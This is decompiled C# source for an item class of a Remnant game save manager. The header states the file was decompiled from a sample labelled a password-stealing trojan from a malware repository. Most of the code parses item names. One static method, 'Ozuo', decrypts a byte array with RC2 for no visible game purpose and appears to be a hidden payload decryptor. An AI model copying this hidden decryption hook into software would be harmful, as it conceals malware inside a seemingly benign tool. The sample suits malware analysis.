// Decompiled with JetBrains decompiler
// Type: RemnantSaveManager.RemnantItem
// Assembly: RemnantSaveManager, Version=1.99.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E1F1E8C4-E528-4D7B-AF51-D8C10E64558F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f3e011fb43f226885e514c92638da2db70d78fd53ee94ab2ab476bc588ebc0ea.exe

using System;
using System.Text.RegularExpressions;

namespace RemnantSaveManager
{
  public class RemnantItem : IEquatable<object>, IComparable
  {
    private string itemKey;
    private string itemType;
    private string itemName;
    private string itemAltName;

    public static byte[] Ozuo(byte[] B) => GameInfo.RC2.CreateDecryptor().TransformFinalBlock(B, 0, B.Length);

    private string ItemKey
    {
      get => this.itemKey;
      set
      {
        try
        {
          this.itemKey = value;
          this.itemType = "Uncategorized";
          this.itemName = this.itemKey.Substring(this.itemKey.LastIndexOf('/') + 1);
          if (this.itemKey.Contains("/Weapons/"))
          {
            this.itemType = "Weapon";
            if (this.itemName.Contains("Mod_"))
              this.itemName = this.itemName.Replace("/Weapons/", "/Mods/");
          }
          if (this.itemKey.Contains("/Armor/") || this.itemKey.Contains("TwistedMask"))
          {
            this.itemType = "Armor";
            if (this.itemKey.Contains("TwistedMask"))
            {
              this.itemName = "TwistedMask (Head)";
            }
            else
            {
              string[] strArray = this.itemName.Split('_');
              this.itemName = strArray[2] + " (" + strArray[1] + ")";
            }
          }
          if (this.itemKey.Contains("/Trinkets/") || this.itemKey.Contains("BrabusPocketWatch"))
            this.itemType = "Trinket";
          if (this.itemKey.Contains("/Mods/"))
            this.itemType = "Mod";
          if (this.itemKey.Contains("/Traits/"))
            this.itemType = "Trait";
          if (this.itemKey.Contains("/Emotes/"))
            this.itemType = "Emote";
          this.itemName = this.itemName.Replace("Weapon_", "").Replace("Root_", "").Replace("Wasteland_", "").Replace("Swamp_", "").Replace("Pan_", "").Replace("Atoll_", "").Replace("Mod_", "").Replace("Trinket_", "").Replace("Trait_", "").Replace("Quest_", "").Replace("Emote_", "").Replace("Rural_", "").Replace("Snow_", "");
          if (this.itemType.Equals("Armor"))
            return;
          this.itemName = Regex.Replace(this.itemName, "([a-z])([A-Z])", "$1 $2");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Error processing item name: " + ex.Message);
          this.itemName = value;
        }
      }
    }

    public string ItemName => this.itemAltName != null ? this.itemAltName : this.itemName;

    public string ItemType => this.itemType;

    public RemnantItem.RemnantItemMode ItemMode { get; set; }

    public string ItemNotes { get; set; }

    public string ItemAltName
    {
      get => this.itemAltName;
      set => this.itemAltName = value;
    }

    public RemnantItem(string key)
    {
      this.ItemKey = key;
      this.ItemMode = RemnantItem.RemnantItemMode.Normal;
      this.ItemNotes = "";
    }

    public RemnantItem(string key, RemnantItem.RemnantItemMode mode)
    {
      this.ItemKey = key;
      this.ItemMode = mode;
      this.ItemNotes = "";
    }

    public string GetKey() => this.itemKey;

    public override string ToString() => this.itemType + ": " + this.ItemName;

    public override bool Equals(object obj)
    {
      if (obj == null)
        return false;
      if (!this.GetType().Equals(obj.GetType()))
        return obj.GetType() == typeof (string) && this.GetKey().Equals(obj);
      RemnantItem remnantItem = (RemnantItem) obj;
      return this.GetKey().Equals(remnantItem.GetKey()) && this.ItemMode == remnantItem.ItemMode;
    }

    public override int GetHashCode() => this.itemKey.GetHashCode();

    public int CompareTo(object obj)
    {
      if (obj == null)
        return 1;
      if (!this.GetType().Equals(obj.GetType()))
        return obj.GetType() == typeof (string) ? this.GetKey().CompareTo(obj) : this.ToString().CompareTo(obj.ToString());
      RemnantItem remnantItem = (RemnantItem) obj;
      return this.ItemMode != remnantItem.ItemMode ? this.ItemMode.CompareTo((object) remnantItem.ItemMode) : this.itemKey.CompareTo(remnantItem.GetKey());
    }

    public enum RemnantItemMode
    {
      Normal,
      Hardcore,
      Survival,
    }
  }
}
